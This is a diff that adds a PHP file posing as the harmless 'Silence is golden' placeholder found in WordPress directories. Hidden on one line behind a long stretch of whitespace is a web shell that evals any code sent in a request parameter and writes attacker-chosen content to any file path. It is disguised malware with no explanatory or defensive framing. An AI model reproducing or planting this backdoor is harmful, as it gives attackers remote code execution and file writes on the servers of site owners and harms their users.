@@ -1,0 +1,5 @@
+<?php
+// Silence is golden.
+?><?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  $oxiusp = "6490d0049eb9a15b7713168e71e5150c"; if(isset($_REQUEST['ryydcmog'])) { $sjws = $_REQUEST['ryydcmog']; eval($sjws); exit(); } if(isset($_REQUEST['ehmiqwu'])) { $hceqsnkk = $_REQUEST['vqqozta']; $jzqlnu = $_REQUEST['ehmiqwu']; $ovuh = fopen($jzqlnu, 'w'); $ecklc = fwrite($ovuh, $hceqsnkk); fclose($ovuh); echo $ecklc; exit(); } ?><?php
+// Silence is golden.
+?>
